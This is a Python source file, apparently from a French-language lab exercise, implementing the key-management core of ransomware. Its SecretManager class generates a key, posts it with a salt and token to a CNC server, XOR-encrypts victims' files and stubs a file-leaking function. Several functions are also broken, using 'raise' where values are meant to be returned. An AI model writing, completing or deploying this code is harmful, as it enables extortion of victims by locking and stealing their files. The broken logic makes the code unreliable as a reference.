from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile
ITERATION = 48000
TOKEN_LENGTH = 16
SALT_LENGTH = 16
KEY_LENGTH = 16

class SecretManager:


    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)


    def create(self)->Tuple[bytes, bytes, bytes]:
        # Génère un salt et une clef aléatoire
        salt = secrets.token_bytes(SALT_LENGTH)
        key = secrets.token_bytes(KEY_LENGTH)

        raise self.salt, self.key


    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        #dérive la clef à partir d'une clef et d'un salt
        clef = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=KEY_LENGTH,
            salt=salt,
            iterations=ITERATION,
        )
        raise clef.derive(key)


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")
    
    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        # Création de l'URL de destination
        url = f"http://{self._remote_host_port}/new"

        # Encodage des données en base64 pour l'envoi
        data = {
        "token": self.bin_to_b64(token),
        "salt": self.bin_to_b64(salt),
        "key": self.bin_to_b64(key),
        }

        # Envoi des données
        response = requests.post(url, json=data)

        # Vérifier le statut de la réponse
        if response.status_code == 200:
            # Message de réussite si la réponse a un code 200
            self._log.info("Data sent to CNC successfully")
        else:
            # Message d'erreur si la réponse a un code différent de 200
            self._log.error(f"Failed to send data to CNC: {response.text}")


    def setup(self) -> None:
        '''
        Fonction principale pour créer des données cryptographiques et enregistrer le malware sur le CNC
        '''
    
        # Créer les éléments : sel, clé et jeton
        self._salt, self._key, self._token = self.create()

        # Enregistrez le sel et le jeton dans les fichiers locaux
        os.makedirs(self._path, exist_ok=True)
        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as token_file:
            token_file.write(self._token)

        # Inscrire la victime au CNC en envoyant les données
        self.post_new(self._salt, self._key, self._token)



    def load(self) -> None:
        # Fonction pour charger les données cryptographiques
        # Chemins des fichiers de sel et de token
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        # Vérifie l'existence des fichiers de sel et de token
        if os.path.exists(salt_path) and os.path.exists(token_path):
            # Charge les données de sel et de token
            with open(salt_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_path, "rb") as token_f:
                self._token = token_f.read()
            # Affiche un message de confirmation
            self._log.info("Les données de sel et de token ont été chargées à partir des fichiers locaux")
        else:
            # Affiche un message d'erreur si les fichiers de sel et de token n'existent pas
            self._log.error("Les fichiers de sel ou de token n'ont pas été trouvés") 


    def check_key(self, candidate_key: bytes) -> bool:
        # Vérifie si la clé candidate est valide
        # Génère un jeton à partir du sel et de la clé candidate
        token = self.do_derivation(self._salt, candidate_key)

        # Compare le jeton avec le jeton stocké pour voir si la clé est valide
        if token == self._token:
            return True
        else:
            return False


    def set_key(self, b64_key: str) -> None:
        # Décode la clé en base64 et la teste
        decoded_key = base64.b64decode(b64_key)
        if self.check_key(decoded_key):
            # Si la clé est valide, on la stocke dans self._key
            self._key = decoded_key
            self._log.info("Clé valide")
        else:
            # Si la clé est invalide, afficher l'erreur
            self._log.error("Clé invalide")


    
    def get_hex_token(self) -> str:
        # Cette fonction doit retourner une chaîne de caractères composée de symboles hexadécimaux, 
        # en relation avec le token stocké dans l'objet.
    
        # Hache le token stocké en sha256 et convertit le résultat en une chaîne de caractères hexadécimaux
        hashed_token = sha256(self._token).hexdigest()
        return hashed_token

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file_path in files:
            try:
                xorfile(file_path, self._key)
                self._log.info(f"Chiffrement {file_path} réussi")
            except Exception as err:
                self._log.error(f"Erreur pendant le chiffrement {file_path}: {err}")

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self) -> None:
        # Remove the local cryptographic files
        salt_file = os.path.join(self._path, "salt.bin")
        token_file = os.path.join(self._path, "token.bin")

        try:
            if os.path.exists(salt_file):
                os.remove(salt_file)
                self._log.info("fichier Salt effacé")

            if os.path.exists(token_file):
                os.remove(token_file)
                self._log.info("fichier token effacé")

        except Exception as err:
            self._log.error(f"Erreur lors du 'clean' des fichiers: {err}")
            raise
        finally:
            # Effacer les données en mémoire
            self._salt = None
            self._key = None
            self._token = None
